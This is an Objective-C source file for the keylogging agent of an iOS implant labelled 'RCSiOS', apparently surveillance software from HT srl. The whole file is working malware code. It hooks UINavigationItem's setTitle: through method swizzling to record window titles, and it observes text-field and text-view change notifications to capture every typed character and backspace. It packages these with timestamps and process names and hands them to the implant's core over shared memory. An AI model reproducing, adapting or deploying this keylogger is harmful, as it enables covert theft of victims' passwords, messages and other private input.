/*
 * RCSiOS - InputLogger Agent
 *
 *
 * Created on 03/08/2010
 * Copyright (C) HT srl 2010. All rights reserved
 *
 */
#import <objc/runtime.h>
#import <UIKit/UIKit.h>

#import "RCSIAgentInputLogger.h"
#import "RCSISharedMemory.h"
#import "RCSICommon.h"

//#define DEBUG
#define CONTEXT_MANDATORY 0xFFFF0000;

static NSString *gWindowTitle      = nil;
u_int gPrevStringLen               = 0;

@implementation agentKeylog

#pragma mark -
#pragma mark UITextInput position
#pragma mark -

- (id)__start:(id)anObject
{
  id retVal = nil;
  
  if ([anObject respondsToSelector:@selector(start)] == NO)
    return retVal;
  
  NSMethodSignature *sigStart =
    [[anObject class] instanceMethodSignatureForSelector: @selector(start)];
  
  NSInvocation *invStart =
    [NSInvocation invocationWithMethodSignature: sigStart];
  
  [invStart setTarget: anObject];
  [invStart setSelector:@selector(start)];
  [invStart invoke];
  
  [invStart getReturnValue:&retVal];
  
  return retVal;
}

- (int)offsetFromPosition:(id)fromPos
               toPosition:(id)toPos
                forObject:(id)anObject
{
  int retVal = 0;
  
  if ([anObject respondsToSelector:@selector(offsetFromPosition:toPosition:)] == NO)
    return retVal;
  
  id toPosStart = [self __start:toPos];
  
  if (toPosStart == nil)
    return retVal;
  
  NSMethodSignature *sigOffPos =
    [[anObject class] instanceMethodSignatureForSelector: @selector(offsetFromPosition:toPosition:)];
  
  NSInvocation *invOffPos =
    [NSInvocation invocationWithMethodSignature: sigOffPos];
  
  [invOffPos setTarget: anObject];
  [invOffPos setSelector:@selector(offsetFromPosition:toPosition:)];
  [invOffPos setArgument: &fromPos atIndex:2];
  [invOffPos setArgument: &toPosStart atIndex:3];
  
  [invOffPos invoke];
  
  [invOffPos getReturnValue:&retVal];
  
  return retVal;
}

- (id)beginningOfDocument:(id)anObject
{
  id retVal = nil;
  
  if ([anObject respondsToSelector:@selector(beginningOfDocument)] == NO)
    return retVal;
  
  NSMethodSignature *sigBegDoc =
  [[anObject class] instanceMethodSignatureForSelector: @selector(beginningOfDocument)];
  
  NSInvocation *invBegDoc =
  [NSInvocation invocationWithMethodSignature: sigBegDoc];
  
  [invBegDoc setTarget: anObject];
  [invBegDoc setSelector:@selector(beginningOfDocument)];
  [invBegDoc invoke];
  
  [invBegDoc getReturnValue:&retVal];
  
  return retVal;
}

- (id)selectedTextRange:(id)anObject
{
  id retVal = nil;
  
  if ([anObject respondsToSelector:@selector(selectedTextRange)] == NO)
    return retVal;
  
  NSMethodSignature *sigSelTxt =
    [[anObject class] instanceMethodSignatureForSelector: @selector(selectedTextRange)];
  
  NSInvocation *invSelTxt =
    [NSInvocation invocationWithMethodSignature: sigSelTxt];
  
  [invSelTxt setTarget: anObject];
  [invSelTxt setSelector:@selector(selectedTextRange)];
  [invSelTxt invoke];
  
  [invSelTxt getReturnValue:&retVal];
  
  return retVal;
}

- (unsigned int)textPosition:(NSNotification*)aNotification
{
  unsigned int pos = 0;

  id obj = [aNotification object];
  
  if ([obj respondsToSelector:@selector(selectedTextRange)])
  {
    id selectedRange = [self selectedTextRange:obj];
    
    if (selectedRange == nil)
      return pos;
    
    id textPosition  = [self beginningOfDocument:obj];
    
    if (textPosition ==  nil)
      return pos;
    
    pos = [self offsetFromPosition:textPosition
                        toPosition:selectedRange
                         forObject:obj];
  }
  
  return pos;
}

#pragma mark -
#pragma mark Window title method
#pragma mark -

- (void)setTitleHook: (NSString *)arg1
{
  [self setTitleHook: arg1];
  
  @synchronized(self)
  {
    if (gWindowTitle != nil && [gWindowTitle isKindOfClass: [NSString class]])
    {
      if ([gWindowTitle isEqualToString: arg1] == FALSE)
      {
        [gWindowTitle release];
        gWindowTitle = [arg1 copy];
      }
    }
    else if (gWindowTitle == nil)
    {
      gWindowTitle = [arg1 copy];
    }
  }
}

#pragma mark -
#pragma mark Keylog Logging
#pragma mark -

- (void)writeKeylog
{
  time_t rawtime;
  struct tm *tmTemp;
  struct timeval tp;
  NSMutableData *logData;
  NSMutableData *processName;
  NSMutableData *windowName;
  NSMutableData *contentData;
  
  logData   = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData = [[NSMutableData alloc] init];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  shMemoryHeader->flag  = 0;
  short unicodeNullTerminator = 0x0000;
  
  if (mContextHasBeenSwitched == TRUE)
  {
    /*
     * the program, window info must be written down too 
     */
    shMemoryHeader->flag  = CONTEXT_MANDATORY;
    mContextHasBeenSwitched = FALSE;
  }
  
  // Dummy word
  short dummyWord = 0x0000;
  [entryData appendBytes: &dummyWord
                  length: sizeof(short)];
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  [entryData appendBytes: (const void *)tmTemp
                  length: sizeof (struct tm) - 0x8];
  
  NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
  NSString *_processName      = [[processInfo processName] copy];
  processName  = [[NSMutableData alloc] initWithData:
                  [_processName dataUsingEncoding:
                   NSUTF16LittleEndianStringEncoding]];
  
  // Process Name
  [entryData appendData: processName];
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  @synchronized(self)
  {
    if ([gWindowTitle isEqualToString: @""] || gWindowTitle == nil)
    {
      windowName = [[NSMutableData alloc] initWithData:
                    [@"EMPTY" dataUsingEncoding:
                     NSUTF16LittleEndianStringEncoding]];
    }
    else
    {
      windowName = [[NSMutableData alloc] initWithData:
                    [gWindowTitle dataUsingEncoding:
                     NSUTF16LittleEndianStringEncoding]];
    }
  }
  
  // Window Name
  [entryData appendData: windowName];
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Delimeter
  unsigned long del = DELIMETER;
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  [processName release];
  [_processName release];
  [windowName release];

  /*
   * the window and process info must be stored
   * because sync will recreate the log stream
   * (see RCSILogManager ProcessNewLog)
   */
  shMemoryHeader->flag  |= ([entryData length] & 0x0000FFFF);
  
  contentData = [[NSMutableData alloc] initWithData:
                 [mBufferString dataUsingEncoding:
                  NSUTF16LittleEndianStringEncoding]];
  
  // Log buffer
  [entryData appendData: contentData];
  
  gettimeofday(&tp, NULL);
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = 0;
  shMemoryHeader->agentID         = LOG_KEYLOG;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
  
  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  [[_i_SharedMemory sharedInstance] writeIpcBlob:logData];
  
  [logData release];
  [entryData release];
  [contentData release];
}

#pragma mark -
#pragma mark UITextInput input changed callback
#pragma mark -

- (void)keyPressed: (NSNotification *)aNotification
{
  NSString *_singleChar;
  
  if (mBufferString == nil)
    mBufferString = [[NSMutableString alloc] init];
  
  NSString *_fullText   = [[aNotification object] text];
 
  if ([_fullText length] > 0)
    {
      unsigned int pos = [self textPosition: aNotification];
      
      /*
       * text position on UITextInput is always >= 1
       */
      if (pos <= 0)
        pos = [_fullText length];
      
      _singleChar = [_fullText substringWithRange: NSMakeRange(pos - 1, 1)];
      
      // Backspace
      if ([_fullText length] < gPrevStringLen)
        _singleChar = @"\u2408";
      
      if ([mBufferString length] < KEY_MAX_BUFFER_SIZE)
        {
          [mBufferString appendString: _singleChar];
        }
      else
        {
          [self writeKeylog];
          
          [mBufferString release];
          mBufferString = [[NSMutableString alloc] init];
          [mBufferString appendString: _singleChar];
        }
    
      gPrevStringLen = [_fullText length];
    }
}

#pragma mark -
#pragma mark Init method
#pragma mark -

- (id)init
{
  self = [super init];
  
  if (self != nil)
    mAgentID = AGENT_KEYLOG;
  
  return self;
}

#pragma mark -
#pragma mark Agent method
#pragma mark -

- (BOOL)start
{
  BOOL retVal = TRUE;

  if ([self mAgentStatus] == AGENT_STATUS_STOPPED )
    {
      Class className   = objc_getClass("UINavigationItem");
      Class classSource = [self class];
      
      if (className != nil)
        {         
          IMP newImpl = class_getMethodImplementation(classSource, @selector(setTitleHook:));
          
          [self swizzleByAddingIMP:className 
                           withSEL:@selector(setTitle:) 
                    implementation:newImpl
                      andNewMethod:@selector(setTitleHook:)];
        }
      
      /*
       * context switched every time
       * the app is launched or resumed from bg
       */
      
      mContextHasBeenSwitched = TRUE;
      
      /*
       * checking for a valid method swapping before return OK
       * [self validateHook];
       */
      
      [[NSNotificationCenter defaultCenter] addObserver: self
                                               selector: @selector(keyPressed:)
                                                   name: UITextFieldTextDidChangeNotification
                                                 object: nil];
      [[NSNotificationCenter defaultCenter] addObserver: self
                                               selector: @selector(keyPressed:)
                                                   name: UITextViewTextDidChangeNotification
                                                 object: nil];
      
      [self setMAgentStatus: AGENT_STATUS_RUNNING];
    }
  
  return retVal;
}

- (void)stop
{
  if ([self mAgentStatus] == AGENT_STATUS_RUNNING )
    {
      Class className = objc_getClass("UINavigationItem");
      
      if (className != nil)
        {
          IMP   oldImpl = class_getMethodImplementation(className, @selector(setTitleHook:));
          
          [self swizzleByAddingIMP:className 
                          withSEL:@selector(setTitle:) 
                    implementation:oldImpl
                      andNewMethod:@selector(setTitleHook:)];
        }
      
      [[NSNotificationCenter defaultCenter] removeObserver: self];
      
      [self setMAgentStatus: AGENT_STATUS_STOPPED];
    }
}

@end